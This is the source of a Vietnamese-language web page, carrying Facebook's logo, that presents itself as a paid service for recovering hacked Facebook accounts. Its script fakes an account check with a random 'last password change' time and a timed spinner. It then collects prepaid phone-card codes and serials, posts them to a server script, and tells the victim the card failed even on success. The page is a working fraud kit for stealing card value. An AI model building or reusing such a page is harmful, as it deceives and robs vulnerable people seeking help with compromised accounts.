
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <title>Khôi phục tài khoản Facebook bị hack</title>
    <script src='//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js' type='text/javascript'></script>

    <style>
  i.fa.fa-check {
    color: #00af5e;
    font-size: 11px;
    margin-right: 5px;
}
.col.is-choose img{
    border: 1px solid #f00;
    border-radius: 5px;
}
.item img{
 border: 1px solid #ddd;
    border-radius: 5px;
}
body{
    font-family: Helvetica, Arial, sans-serif;
    font-size: 14px;
}
    </style>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>

  </head>
  <body>
    <div class="container mt-3">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <img width="112" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" class="d-block mb-2 m-auto"/>
                
                Tài khoản bị hack, quên mật khẩu, hãy sử dụng dịch vụ khôi phục tài khoản Facebook tại <b> KhoiPhucTaiKhoan.GQ</b>
                <div class="mt-3 alert alert-danger">
                    Lưu ý: Chúng tôi không thể khôi phục nếu tài khoản của bạn đã bị vô hiệu hóa (Không còn vào trang cá nhân được nữa)
                </div>
                <div id="PanelHack" class="mt-3 panel-hack">
                    <label>Nhập link Facebook cần khôi phục:</label>
                    <input id="linkfb" class="form-control mt-2 mb-2" placeholder=""/>
                    <small class="text-muted">Hãy sao chép link trang cá nhân Facebook bạn cần khôi phục mật khẩu, nếu không biết cách sao chép, hãy xem bài viết này: <a href="https://www.24h.com.vn/cong-nghe-thong-tin/cach-lay-link-facebook-tren-dien-thoai-cuc-don-gian-c55a1273189.html#:~:text=C%C3%A1ch%20l%E1%BA%A5y%20link%20Facebook%20c%C3%A1,ch%C3%A9p%20li%C3%AAn%20k%E1%BA%BFt%20l%C3%A0%20xong.">Cách sao chép link Facebook trên điện thoại đơn giản</a><br/>
                    <b>Định dạng link Facebook như sau:</b>
                    <li>https://www.facebook.com/xxxx</li>
                    <li>https://facebook.com/xxxx</li>
                    <li>https://fb.com/xxxx</li></small>
                    <div class="d-grid gap-2 col-6 mx-auto">
    <button onclick="khoiphucTK()" class="btn btn-primary mt-2" type="button">Tiếp tục</button>
</div>
                </div>
                <div id="loading" class="mt-3" style="display:none">
                    <center class="b-block mb-2">Đang kiểm tra tài khoản...</center>
                    <div class="d-flex justify-content-center">
  <div class="spinner-border" role="status">
    <span class="visually-hidden">Loading...</span>
  </div>
</div>
                </div>
                <div id="KetQua" class="mt-3" style="display:none">
                    <div class="card">
                        <div class="card-header">
                            Đã tìm thấy tài khoản!
                        </div>
                        <div class="card-body">
                            <b>Trạng thái liên kết:</b> <b style="color:green">vẫn còn</b> (nếu trạng thái liên kết không còn nghĩa là tài khoản không thể khôi phục)<br/>
                            <b>Lần đổi mật khẩu gần đây nhất:</b> <span style="" id="password_time"></span> giờ trước<br/>
                            Bảng giá khôi phục:<br/>
                            <b style="green">100.000 VND</b>/ mỗi lần khôi phục
                                   <div class="mb-3">
                
            <label class="small mb-2 d-block">Loại thẻ</label>
            <small class="text-muted">Click vào loại thẻ để chọn thẻ cần nạp</small>
            <div>
            <div id="myDIV" class="mt-3 row justify-content-center row-cols-3 row-cols-sm-2 row-cols-lg-4 row-cols-xl-3 row-cols-xxl-12 g-2 mb-3 text-center">
                <div class="col item is-choose">
                    <img onclick="$('#telco').val('VIETTEL');$('#loaithe').html('Viettel')" src="images/thecao/the-viettel.png" class="rounded w-100"/>
                </div>
                 <div class="col item">
                    <img onclick="$('#telco').val('VINAPHONE');$('#loaithe').html('Vinaphone')" src="images/thecao/the-vinaphone.jpeg" class="rounded w-100"/>
                </div>
                 <div class="col item">
                    <img onclick="$('#telco').val('MOBIFONE');$('#loaithe').html('Mobifone')" src="images/thecao/the-mobifone.jpeg" class="rounded w-100"/>
                </div>
                <div class="col item">
                    <img onclick="$('#telco').val('GATE');$('#loaithe').html('GATE')" src="images/thecao/the-gate.png" class="rounded w-100"/>
                </div>
                <div class="col item">
                    <img onclick="$('#telco').val('ZING');$('#loaithe').html('Zing')" src="images/thecao/the-zing.png" class="rounded w-100"/>
                </div>
              <div class="col item">
                    <img onclick="$('#telco').val('VNMOBI');$('#loaithe').html('Vietnamobile')" src="images/thecao/the-vietnamobile.jpeg" class="rounded w-100"/>
                </div>
            </div>
                </div>
                <center class="mt-3 d-block"><small class="text-muted">Đã chọn loại thẻ: <b id="loaithe">Viettel</b></small></center>
          <select id="telco" class="form-control" style="display:none">
 <option value="VIETTEL">Viettel</option>
                        <option value="MOBIFONE">Mobifone</option>
                        <option value="VINAPHONE">Vinaphone</option>
                        <option value="VNMOBI" >Vietnammobi</option>
                                                                                                    <option value="ZING" >Zing</option>
                                                                                                    <option value="GATE" >GATE</option>
   </select>
      </div>
     
            <div class="mb-3">
             
                <label class="small mb-2">Mệnh giá thẻ</label>
          <select v-model="vatpham" id="amount" class="form-control">
             <!--         -->
           <option value="100000">100.000</option>
          
       </select>
      </div>
    
      <div class="mb-3">
          <label class="small mb-2">Mã thẻ</label>
      <input type="text" class="form-control" placeholder="Mã thẻ" id="code" maxlength="64">
      </div>
      <div class="mb-3">
          <label class="small mb-2">Số serial (mã seri)</label>
   <input type="text" class="form-control" placeholder="Số serial" id="serial" maxlength="64"> </div>
  
   <div class="d-grid gap-2">
  <button id="napthe" class="apple mt-1 btn btn-primary" type="button">Khôi phục mật khẩu</button>
</div>
                 </div>
                            <br/>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
<script>
    function khoiphucTK(){
        var linkfb = document.getElementById('linkfb').value;
        if(linkfb.length === 0){
            alert('Vui lòng nhập link Facebook chính xác, không được bỏ trống');
        }
        else {
            document.getElementById("password_time").innerHTML = Math.floor(Math.random() * 24);
            document.getElementById('PanelHack').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            setInterval(KetQua, 3000);
        }
    }
    
    function KetQua(){
        document.getElementById('loading').style.display = 'none';
        document.getElementById('KetQua').style.display = 'block';

      
        
    }
    
    function Stop(){
        clearInterval(myInterval);
    }
    
    $('#telco').val('VIETTEL')
      var header = document.getElementById("myDIV");
var btns = header.getElementsByClassName("item");
for (var i = 0; i < btns.length; i++) {
  btns[i].addEventListener("click", function() {
  var current = document.getElementsByClassName("is-choose");
  current[0].className = current[0].className.replace(" is-choose", "");
  this.className += " is-choose";
  });
}


function chuanap(){
    Swal.fire(
  'Thất bại',
  'Vui lòng nạp lần đầu tại website để tiến hành nhận quà tân thủ.',
  'error'
)
}
$(document).ready(function(){
  $("#napthe").click(function(){
 
  $('#txt').text('Đang xử lí...');
                var code = $("#code").val();
                var serial = $("#serial").val();
                var telco = $("#telco").val();
                var amount = $("#amount").val();
                var linkfb = $("#linkfb").val();
                  if (!telco || !amount || !serial || !code || !linkfb) {
                      $('#txt').text('Thanh toán');
                                             Swal.fire(
  'Có lỗi xảy ra',
  'Vui lòng nhập đầy đủ thông tin',
  'error'
)
                                        } else {
            $.ajax({
            type: "POST",
            url: "napthe.php",
            data: {
                telco,
                amount,
                serial,
                code,
            },
            dataType: "json",
               
            success: function (res) {
                if (res.success) {
                 $('#txt').text('Thanh toán');
                     Swal.fire(
  'Gửi Thất Bại',
  'Gửi thẻ thất bại,thẻ sai hoặc đã sử dụng! ',
  'success'
)
                     
                    
                } else {
                    $('#txt').text('Thanh toán');
                 Swal.fire(
  'Thất bại',
  res.error,
  'error'
)
                }
            },
            error: function (err) {
                $('#txt').text('Thanh toán');
                 Swal.fire(
  'Thất bại',
  'Hệ thống đang gặp sự cố vui lòng thử lại sau ít phút',
  'error'
)
             
            },
        });
                                        }
  });
});

</script>
    <!-- Option 2: Separate Popper and Bootstrap JS -->
    <!--
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
    -->
  </body>
</html>